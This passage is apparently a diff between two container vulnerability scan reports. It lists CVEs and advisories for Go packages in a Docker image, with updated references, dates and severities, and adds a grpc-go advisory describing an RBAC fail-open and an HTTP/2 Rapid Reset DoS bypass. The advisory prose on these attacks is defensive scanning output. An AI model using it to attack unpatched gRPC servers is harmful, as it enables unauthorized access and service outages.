+│                        │      │                  ├ [12]: https://go-review.googlesource.com/c/go/+/761581 
+│                        │      │                  ├ [13]: https://go-review.googlesource.com/c/net/+/761640 
+│                        │      │                  ├ [14]: https://go.dev/cl/761581 
+│                        │      │                  ├ [15]: https://go.dev/cl/761640 
+│                        │      │                  ├ [16]: https://go.dev/issue/78476 
+│                        │      │                  ├ [17]: https://groups.google.com/g/golang-announce/c/qcCIEX
 │                        │      │                  │       so47M 
-│                        │      │                  ├ [17]: https://linux.oracle.com/cve/CVE-2026-33814.html 
-│                        │      │                  ├ [18]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
-│                        │      │                  ├ [19]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
-│                        │      │                  ├ [20]: https://pkg.go.dev/vuln/GO-2026-4918 
-│                        │      │                  ├ [21]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  ├ [18]: https://linux.oracle.com/cve/CVE-2026-33814.html 
+│                        │      │                  ├ [19]: https://linux.oracle.com/errata/ELSA-2026-22121.html 
+│                        │      │                  ├ [20]: https://nvd.nist.gov/vuln/detail/CVE-2026-33814 
+│                        │      │                  ├ [21]: https://pkg.go.dev/vuln/GO-2026-4918 
+│                        │      │                  ├ [22]: https://security.access.redhat.com/data/csaf/v2/vex/
 │                        │      │                  │       2026/cve-2026-33814.json 
-│                        │      │                  ├ [22]: https://ubuntu.com/security/notices/USN-8430-1 
-│                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8471-1 
-│                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8472-1 
-│                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8473-1 
-│                        │      │                  ╰ [26]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
+│                        │      │                  ├ [23]: https://ubuntu.com/security/notices/USN-8430-1 
+│                        │      │                  ├ [24]: https://ubuntu.com/security/notices/USN-8471-1 
+│                        │      │                  ├ [25]: https://ubuntu.com/security/notices/USN-8472-1 
+│                        │      │                  ├ [26]: https://ubuntu.com/security/notices/USN-8473-1 
+│                        │      │                  ╰ [27]: https://www.cve.org/CVERecord?id=CVE-2026-33814 
 │                        │      ├ PublishedDate   : 2026-05-07T20:16:42.88Z 
-│                        │      ╰ LastModifiedDate: 2026-07-15T02:20:18.21Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:10.55Z 
 │                        ├ [3]  ╭ VulnerabilityID : CVE-2026-39821 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5026 
 │                        │      ├ PkgID           : golang.org/x/net@v0.40.0 
@@ -6896,40 +7956,58 @@
 │                        │      │                  ├ [44]: https://access.redhat.com/errata/RHSA-2026:39573 
 │                        │      │                  ├ [45]: https://access.redhat.com/errata/RHSA-2026:39879 
 │                        │      │                  ├ [46]: https://access.redhat.com/errata/RHSA-2026:40118 
-│                        │      │                  ├ [47]: https://access.redhat.com/errata/RHSA-2026:40119 
-│                        │      │                  ├ [48]: https://access.redhat.com/errata/RHSA-2026:40262 
-│                        │      │                  ├ [49]: https://access.redhat.com/errata/RHSA-2026:40945 
-│                        │      │                  ├ [50]: https://access.redhat.com/errata/RHSA-2026:41019 
-│                        │      │                  ├ [51]: https://access.redhat.com/errata/RHSA-2026:41030 
-│                        │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:41031 
-│                        │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:41036 
-│                        │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:41055 
-│                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41066 
-│                        │      │                  ├ [56]: https://access.redhat.com/security/cve/CVE-2026-39821 
-│                        │      │                  ├ [57]: https://bugzilla.redhat.com/2480756 
-│                        │      │                  ├ [58]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
-│                        │      │                  ├ [59]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
-│                        │      │                  ├ [60]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [47]: https://access.redhat.com/errata/RHSA-2026:40262 
+│                        │      │                  ├ [48]: https://access.redhat.com/errata/RHSA-2026:40945 
+│                        │      │                  ├ [49]: https://access.redhat.com/errata/RHSA-2026:41019 
+│                        │      │                  ├ [50]: https://access.redhat.com/errata/RHSA-2026:41030 
+│                        │      │                  ├ [51]: https://access.redhat.com/errata/RHSA-2026:41031 
+│                        │      │                  ├ [52]: https://access.redhat.com/errata/RHSA-2026:41036 
+│                        │      │                  ├ [53]: https://access.redhat.com/errata/RHSA-2026:41055 
+│                        │      │                  ├ [54]: https://access.redhat.com/errata/RHSA-2026:41066 
+│                        │      │                  ├ [55]: https://access.redhat.com/errata/RHSA-2026:41928 
+│                        │      │                  ├ [56]: https://access.redhat.com/errata/RHSA-2026:41930 
+│                        │      │                  ├ [57]: https://access.redhat.com/errata/RHSA-2026:42043 
+│                        │      │                  ├ [58]: https://access.redhat.com/errata/RHSA-2026:42047 
+│                        │      │                  ├ [59]: https://access.redhat.com/errata/RHSA-2026:42048 
+│                        │      │                  ├ [60]: https://access.redhat.com/errata/RHSA-2026:42049 
+│                        │      │                  ├ [61]: https://access.redhat.com/errata/RHSA-2026:42050 
+│                        │      │                  ├ [62]: https://access.redhat.com/errata/RHSA-2026:42051 
+│                        │      │                  ├ [63]: https://access.redhat.com/errata/RHSA-2026:42078 
+│                        │      │                  ├ [64]: https://access.redhat.com/errata/RHSA-2026:42079 
+│                        │      │                  ├ [65]: https://access.redhat.com/errata/RHSA-2026:42080 
+│                        │      │                  ├ [66]: https://access.redhat.com/errata/RHSA-2026:42082 
+│                        │      │                  ├ [67]: https://access.redhat.com/errata/RHSA-2026:42132 
+│                        │      │                  ├ [68]: https://access.redhat.com/errata/RHSA-2026:42142 
+│                        │      │                  ├ [69]: https://access.redhat.com/errata/RHSA-2026:42146 
+│                        │      │                  ├ [70]: https://access.redhat.com/errata/RHSA-2026:42150 
+│                        │      │                  ├ [71]: https://access.redhat.com/errata/RHSA-2026:42151 
+│                        │      │                  ├ [72]: https://access.redhat.com/errata/RHSA-2026:42240 
+│                        │      │                  ├ [73]: https://access.redhat.com/errata/RHSA-2026:42644 
+│                        │      │                  ├ [74]: https://access.redhat.com/security/cve/CVE-2026-39821 
+│                        │      │                  ├ [75]: https://bugzilla.redhat.com/2480756 
+│                        │      │                  ├ [76]: https://bugzilla.redhat.com/show_bug.cgi?id=2480756 
+│                        │      │                  ├ [77]: https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
+│                        │      │                  ├ [78]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-39821 
-│                        │      │                  ├ [61]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
+│                        │      │                  ├ [79]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2
 │                        │      │                  │       026-39822 
-│                        │      │                  ├ [62]: https://errata.almalinux.org/9/ALSA-2026-37435.html 
-│                        │      │                  ├ [63]: https://errata.rockylinux.org/RLSA-2026:37435 
-│                        │      │                  ├ [64]: https://github.com/golang/go/issues/78760 
-│                        │      │                  ├ [65]: https://go.dev/cl/767220 
-│                        │      │                  ├ [66]: https://go.dev/issue/78760 
-│                        │      │                  ├ [67]: https://groups.google.com/g/golang-announce/c/iI-mYS
+│                        │      │                  ├ [80]: https://errata.almalinux.org/9/ALSA-2026-37435.html 
+│                        │      │                  ├ [81]: https://errata.rockylinux.org/RLSA-2026:37435 
+│                        │      │                  ├ [82]: https://github.com/golang/go/issues/78760 
+│                        │      │                  ├ [83]: https://go.dev/cl/767220 
+│                        │      │                  ├ [84]: https://go.dev/issue/78760 
+│                        │      │                  ├ [85]: https://groups.google.com/g/golang-announce/c/iI-mYS
 │                        │      │                  │       I0lu8 
-│                        │      │                  ├ [68]: https://linux.oracle.com/cve/CVE-2026-39821.html 
-│                        │      │                  ├ [69]: https://linux.oracle.com/errata/ELSA-2026-38995.html 
-│                        │      │                  ├ [70]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
-│                        │      │                  ├ [71]: https://pkg.go.dev/vuln/GO-2026-5026 
-│                        │      │                  ├ [72]: https://security.access.redhat.com/data/csaf/v2/vex/
+│                        │      │                  ├ [86]: https://linux.oracle.com/cve/CVE-2026-39821.html 
+│                        │      │                  ├ [87]: https://linux.oracle.com/errata/ELSA-2026-39573.html 
+│                        │      │                  ├ [88]: https://nvd.nist.gov/vuln/detail/CVE-2026-39821 
+│                        │      │                  ├ [89]: https://pkg.go.dev/vuln/GO-2026-5026 
+│                        │      │                  ├ [90]: https://security.access.redhat.com/data/csaf/v2/vex/
 │                        │      │                  │       2026/cve-2026-39821.json 
-│                        │      │                  ├ [73]: https://ubuntu.com/security/notices/USN-8416-1 
-│                        │      │                  ╰ [74]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
+│                        │      │                  ├ [91]: https://ubuntu.com/security/notices/USN-8416-1 
+│                        │      │                  ╰ [92]: https://www.cve.org/CVERecord?id=CVE-2026-39821 
 │                        │      ├ PublishedDate   : 2026-05-22T16:16:20.41Z 
-│                        │      ╰ LastModifiedDate: 2026-07-17T13:18:31.383Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:16.797Z 
 │                        ├ [4]  ╭ VulnerabilityID : CVE-2025-47911 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-4440 
 │                        │      ├ PkgID           : golang.org/x/net@v0.40.0 
@@ -7188,9 +8266,11 @@
 │                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                        │      │                    of a parameter value overflows the message buffer. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                        │                         ├ [1]: https://go.dev/issue/79795 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                        │      │                  ├ [1]: https://go.dev/issue/79795 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
 │                        ├ [10] ╭ VulnerabilityID : CVE-2026-39824 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5024 
 │                        │      ├ PkgID           : golang.org/x/sys@v0.33.0 
@@ -7256,6 +8336,7 @@
 │                        │      ├ Severity        : HIGH 
 │                        │      ├ CweIDs           ─ [0]: CWE-61 
 │                        │      ├ VendorSeverity   ╭ alma       : 3 
+│                        │      │                  ├ amazon     : 2 
 │                        │      │                  ├ bitnami    : 3 
 │                        │      │                  ├ oracle-oval: 3 
 │                        │      │                  ├ redhat     : 3 
@@ -7312,7 +8393,8 @@
 │                               │                   client hello. 
 │                               ├ Severity        : MEDIUM 
 │                               ├ CweIDs           ─ [0]: CWE-201 
-│                               ├ VendorSeverity   ╭ bitnami: 2 
+│                               ├ VendorSeverity   ╭ amazon : 2 
+│                               │                  ├ bitnami: 2 
 │                               │                  ╰ redhat : 2 
 │                               ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I
 │                               │                  │         │           :N/A:N 
@@ -7388,9 +8470,11 @@
 │                              ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                              │                   of a parameter value overflows the message buffer. 
 │                              ├ Severity        : UNKNOWN 
-│                              ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                                                 ├ [1]: https://go.dev/issue/79795 
-│                                                 ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                              ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                              │                  ├ [1]: https://go.dev/issue/79795 
+│                              │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                              ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                              ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
 ├ [10] ╭ Target         : usr/libexec/docker/cli-plugins/docker-buildx 
 │      ├ Class          : lang-pkgs 
 │      ├ Type           : gobinary 
@@ -7719,8 +8803,11 @@
 │                        │      │                  ├ nvd         : 4 
 │                        │      │                  ├ redhat      : 2 
 │                        │      │                  ╰ ubuntu      : 3 
-│                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N
+│                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I
+│                        │      │                  │        │            :H/A:H 
+│                        │      │                  │        ├ V40Vector: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N
 │                        │      │                  │        │            /VI:L/VA:N/SC:H/SI:H/SA:L 
+│                        │      │                  │        ├ V3Score  : 10 
 │                        │      │                  │        ╰ V40Score : 5.6 
 │                        │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:
 │                        │      │                  │        │           H/A:H 
@@ -7867,7 +8954,7 @@
 │                        │      │                  │      026/cve-2026-41567.json 
 │                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
 │                        │      ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
-│                        │      ╰ LastModifiedDate: 2026-07-17T13:18:39.403Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T12:18:28.263Z 
 │                        ├ [7]  ╭ VulnerabilityID : CVE-2026-42306 
 │                        │      ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
 │                        │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -7988,7 +9075,7 @@
 │                        │      │                  │       2026/cve-2026-33997.json 
 │                        │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
 │                        │      ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
-│                        │      ╰ LastModifiedDate: 2026-07-15T02:20:27.623Z 
+│                        │      ╰ LastModifiedDate: 2026-07-20T12:18:47.963Z 
 │                        ├ [9]  ╭ VulnerabilityID : CVE-2026-41568 
 │                        │      ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
 │                        │      ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -8094,9 +9181,11 @@
 │                        │      ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
 │                        │      │                    of a parameter value overflows the message buffer. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/786345 
-│                        │                         ├ [1]: https://go.dev/issue/79795 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/786345 
+│                        │      │                  ├ [1]: https://go.dev/issue/79795 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:01.213Z 
 │                        ├ [12] ╭ VulnerabilityID : CVE-2026-56852 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-5970 
 │                        │      ├ PkgID           : golang.org/x/text@v0.37.0 
@@ -8120,10 +9209,139 @@
 │                        │      ├ Description     : A norm.Iter can enter an infinite loop when handling input
 │                        │      │                   containing invalid UTF-8 bytes. 
 │                        │      ├ Severity        : UNKNOWN 
-│                        │      ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                        │                         ├ [1]: https://go.dev/issue/80142 
-│                        │                         ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
-│                        ├ [13] ╭ VulnerabilityID : CVE-2026-39822 
+│                        │      ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │      │                  ├ [1]: https://go.dev/issue/80142 
+│                        │      │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │      ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ├ [13] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                        │      ├ PkgID           : google.golang.org/grpc@v1.81.1 
+│                        │      ├ PkgName         : google.golang.org/grpc 
+│                        │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
+│                        │      │                  ╰ UID : 94eedbed1f3b6bfb 
+│                        │      ├ InstalledVersion: v1.81.1 
+│                        │      ├ FixedVersion    : 1.82.1 
+│                        │      ├ Status          : fixed 
+│                        │      ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a
+│                        │      │                  │         197d9e39c5494d4581e40 
+│                        │      │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561
+│                        │      │                            df117adb7086d939b6bf5 
+│                        │      ├ SeveritySource  : ghsa 
+│                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                        │      ├ DataSource       ╭ ID  : ghsa 
+│                        │      │                  ├ Name: GitHub Security Advisory Go 
+│                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+
+│                        │      │                          ecosystem%3Ago 
+│                        │      ├ Fingerprint     : sha256:c56560a5498d2416a77fa4f2aef500595d303c994ceeaf6412a5
+│                        │      │                   07d7654e6923 
+│                        │      ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                        │      ├ Description     : Multiple security vulnerabilities have been identified and
+│                        │      │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                        │      │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                        │      │                   implementation (internal/transport). These vulnerabilities
+│                        │      │                   could result in:
+│                        │      │                   
+│                        │      │                   - Authorization Bypass (Fail-Open) when translating xDS
+│                        │      │                   RBAC policies containing `Metadata` or
+│                        │      │                   `RequestedServerName` fields.
+│                        │      │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                        │      │                    Rapid Reset mitigation bypass during client-initiated
+│                        │      │                   stream resets.
+│                        │      │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                        │      │                    RBAC policies containing `NOT` rules around unsupported
+│                        │      │                   fields.
+│                        │      │                   ### Impact
+│                        │      │                   _What kind of vulnerability is it? Who is impacted?_
+│                        │      │                   #### xDS RBAC Authorization Bypass via `Metadata` &
+│                        │      │                   `RequestedServerName` matchers
+│                        │      │                   - Affected Component: xDS RBAC 
+│                        │      │                   - Impact: When building policy matchers for gRPC RBAC from
+│                        │      │                   xDS configurations, unsupported `permission` and
+│                        │      │                   `principal` rules (specifically `Metadata` and
+│                        │      │                   `RequestedServerName`) were silently ignored and treated as
+│                        │      │                    no-ops.
+│                        │      │                     - If an authorization policy relied purely on these
+│                        │      │                   matchers for access control, treating those rules as no-ops
+│                        │      │                    effectively removed the restrictions.
+│                        │      │                   - If these unsupported rules were nested inside logical
+│                        │      │                   `NOT` rules (`Permission_NotRule` / `Principal_NotId`) or
+│                        │      │                   multi-condition `OR/AND` rules, silently dropping them
+│                        │      │                   changed the boolean logic flow of the authorization
+│                        │      │                   engine.
+│                        │      │                   As a result, policy evaluation decisions could fail open,
+│                        │      │                   allowing unauthorized clients to access protected gRPC
+│                        │      │                   services or resources.
+│                        │      │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of
+│                        │      │                   Service via Stream Aborts
+│                        │      │                   - Affected Component: HTTP/2 transport
+│                        │      │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid
+│                        │      │                   Reset only applied threshold checks to items that directly
+│                        │      │                   resulted in control frames being written back to the wire,
+│                        │      │                   such as `SETTINGS` ACKs or server-initiated `RST_STREAM`s.
+│                        │      │                   When a client initiated a rapid flood of stream creation
+│                        │      │                   (`HEADERS`) immediately followed by stream termination
+│                        │      │                   `RST_STREAM`, items queued up in the control buffer without
+│                        │      │                    counting against the transport response frame threshold.
+│                        │      │                   An attacker can repeatedly trigger this flood sequence to
+│                        │      │                   bypass reader blocking, resulting in high CPU usage, and
+│                        │      │                   Denial of Service (DoS).
+│                        │      │                   #### Denial of Service (Panic) in xDS RBAC Engine via
+│                        │      │                   Unsupported Fields inside NOT Rules
+│                        │      │                   - Impact: The xDS RBAC policy translators recursively
+│                        │      │                   generate matchers for nested rules. When a `NOT` rule
+│                        │      │                   wrapped an unsupported or unhandled field (such as
+│                        │      │                   `SourcedMetadata`), the recursive step returned an empty
+│                        │      │                   matcher. This could result in a runtime panic when the RBAC
+│                        │      │                    engine attempts to authorize an incoming request.
+│                        │      │                   An attacker or misconfigured/malicious xDS management
+│                        │      │                   server delivering an LDS/RDS update containing a `NOT` rule
+│                        │      │                    around an unhandled field causes the gRPC server process
+│                        │      │                   to crash immediately (CWE-248 / Denial of Service).
+│                        │      │                   ### Patches
+│                        │      │                   _Has the problem been patched? What versions should users
+│                        │      │                   upgrade to?_
+│                        │      │                   All three issues have been fixed in `master` and will be
+│                        │      │                   released in 1.82.1 shortly.
+│                        │      │                   ### Workarounds
+│                        │      │                   _Is there a way for users to fix or remediate the
+│                        │      │                   vulnerability without upgrading?_
+│                        │      │                   If upgrading grpc-go immediately is not possible, apply the
+│                        │      │                    following workarounds based on your deployment
+│                        │      │                   architecture:
+│                        │      │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that
+│                        │      │                   upstream xDS management servers do not push RBAC policies
+│                        │      │                   containing `Metadata`, `RequestedServerName`, or `NOT`
+│                        │      │                   rules wrapping unsupported fields (such as
+│                        │      │                   `SourcedMetadata`) to grpc-go servers.
+│                        │      │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse
+│                        │      │                   proxies or load balancers (such as Envoy) with strict
+│                        │      │                   HTTP/2 `max_concurrent_streams` limits and active rate
+│                        │      │                   limiting on `RST_STREAM` frequency per connection.
+│                        │      │                   ### Severity
+│                        │      │                     | Vulnerability | Qualitative Severity | Approximate CVSS
+│                        │      │                    v3.1 Score | Primary Impact |
+│                        │      │                     | :--- | :--- | :--- | :--- |
+│                        │      │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` |
+│                        │      │                   Unauthorized Access / Fail-Open |
+│                        │      │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` |
+│                        │      │                   High CPU Consumption / Denial of Service |
+│                        │      │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` |
+│                        │      │                    Process Crash / Denial of Service | 
+│                        │      ├ Severity        : HIGH 
+│                        │      ├ VendorSeverity   ─ ghsa: 3 
+│                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/V
+│                        │      │                         │            I:H/VA:H/SC:N/SI:N/SA:N 
+│                        │      │                         ╰ V40Score : 8.8 
+│                        │      ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
+│                        │      │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab9801
+│                        │      │                  │      3f72a142fe0fc89c19770b2935 
+│                        │      │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
+│                        │      │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
+│                        │      │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/G
+│                        │      │                         HSA-hrxh-6v49-42gf 
+│                        │      ├ PublishedDate   : 2026-07-21T22:03:55Z 
+│                        │      ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
+│                        ├ [14] ╭ VulnerabilityID : CVE-2026-39822 
 │                        │      ├ VendorIDs        ─ [0]: GO-2026-4970 
 │                        │      ├ PkgID           : stdlib@v1.26.4 
 │                        │      ├ PkgName         : stdlib 
@@ -8153,6 +9371,7 @@
 │                        │      ├ Severity        : HIGH 
 │                        │      ├ CweIDs           ─ [0]: CWE-61 
 │                        │      ├ VendorSeverity   ╭ alma       : 3 
+│                        │      │                  ├ amazon     : 2 
 │                        │      │                  ├ bitnami    : 3 
 │                        │      │                  ├ oracle-oval: 3 
 │                        │      │                  ├ redhat     : 3 
@@ -8182,7 +9401,7 @@
 │                        │      │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
 │                        │      ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
 │                        │      ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
-│                        ╰ [14] ╭ VulnerabilityID : CVE-2026-42505 
+│                        ╰ [15] ╭ VulnerabilityID : CVE-2026-42505 
 │                               ├ VendorIDs        ─ [0]: GO-2026-5856 
 │                               ├ PkgID           : stdlib@v1.26.4 
 │                               ├ PkgName         : stdlib 
@@ -8209,7 +9428,8 @@
 │                               │                   client hello. 
 │                               ├ Severity        : MEDIUM 
 │                               ├ CweIDs           ─ [0]: CWE-201 
-│                               ├ VendorSeverity   ╭ bitnami: 2 
+│                               ├ VendorSeverity   ╭ amazon : 2 
+│                               │                  ├ bitnami: 2 
 │                               │                  ╰ redhat : 2 
 │                               ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I
 │                               │                  │         │           :N/A:N 
@@ -8354,7 +9574,7 @@
 │                        │     │                  │      26/cve-2026-41567.json 
 │                        │     │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-41567 
 │                        │     ├ PublishedDate   : 2026-06-05T02:17:13.817Z 
-│                        │     ╰ LastModifiedDate: 2026-07-17T13:18:39.403Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T12:18:28.263Z 
 │                        ├ [2] ╭ VulnerabilityID : CVE-2026-42306 
 │                        │     ├ VendorIDs        ─ [0]: GHSA-rg2x-37c3-w2rh 
 │                        │     ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -8472,7 +9692,7 @@
 │                        │     │                  │       026/cve-2026-33997.json 
 │                        │     │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-33997 
 │                        │     ├ PublishedDate   : 2026-03-31T03:15:57.523Z 
-│                        │     ╰ LastModifiedDate: 2026-07-15T02:20:27.623Z 
+│                        │     ╰ LastModifiedDate: 2026-07-20T12:18:47.963Z 
 │                        ├ [4] ╭ VulnerabilityID : CVE-2026-41568 
 │                        │     ├ VendorIDs        ─ [0]: GHSA-vp62-88p7-qqf5 
 │                        │     ├ PkgID           : github.com/docker/docker@v28.5.2+incompatible 
@@ -8576,10 +9796,136 @@
 │                        │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
 │                        │     │                   containing invalid UTF-8 bytes. 
 │                        │     ├ Severity        : UNKNOWN 
-│                        │     ╰ References       ╭ [0]: https://go.dev/cl/794100 
-│                        │                        ├ [1]: https://go.dev/issue/80142 
-│                        │                        ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
-│                        ├ [7] ╭ VulnerabilityID : CVE-2026-39822 
+│                        │     ├ References       ╭ [0]: https://go.dev/cl/794100 
+│                        │     │                  ├ [1]: https://go.dev/issue/80142 
+│                        │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5970 
+│                        │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
+│                        │     ╰ LastModifiedDate: 2026-07-21T20:17:02.867Z 
+│                        ├ [7] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
+│                        │     ├ PkgID           : google.golang.org/grpc@v1.81.1 
+│                        │     ├ PkgName         : google.golang.org/grpc 
+│                        │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
+│                        │     │                  ╰ UID : 9a383e7fa32dddfe 
+│                        │     ├ InstalledVersion: v1.81.1 
+│                        │     ├ FixedVersion    : 1.82.1 
+│                        │     ├ Status          : fixed 
+│                        │     ├ Layer            ╭ Digest: sha256:96f699030922861f53553074c8a6210954e2bd75c1a1
+│                        │     │                  │         97d9e39c5494d4581e40 
+│                        │     │                  ╰ DiffID: sha256:fcd2c7fef86c2f43de5fcc8026ed4bdf99aae7dd561d
+│                        │     │                            f117adb7086d939b6bf5 
+│                        │     ├ SeveritySource  : ghsa 
+│                        │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
+│                        │     ├ DataSource       ╭ ID  : ghsa 
+│                        │     │                  ├ Name: GitHub Security Advisory Go 
+│                        │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+│                        │     │                          cosystem%3Ago 
+│                        │     ├ Fingerprint     : sha256:e52f1e3e9db35e1356e90c3edf8eeda453355b7e402e3170c12eb
+│                        │     │                   52d3ae74a91 
+│                        │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
+│                        │     ├ Description     : Multiple security vulnerabilities have been identified and
+│                        │     │                   addressed in grpc-go affecting the xDS RBAC authorization
+│                        │     │                   engine (internal/xds/rbac) and the HTTP/2 transport server
+│                        │     │                   implementation (internal/transport). These vulnerabilities
+│                        │     │                   could result in:
+│                        │     │                   
+│                        │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
+│                        │     │                    policies containing `Metadata` or `RequestedServerName`
+│                        │     │                   fields.
+│                        │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
+│                        │     │                   Rapid Reset mitigation bypass during client-initiated stream
+│                        │     │                    resets.
+│                        │     │                   - Denial of Service (Server Panic) when parsing crafted xDS
+│                        │     │                   RBAC policies containing `NOT` rules around unsupported
+│                        │     │                   ### Impact
+│                        │     │                   _What kind of vulnerability is it? Who is impacted?_
+│                        │     │                   #### xDS RBAC Authorization Bypass via `Metadata` &
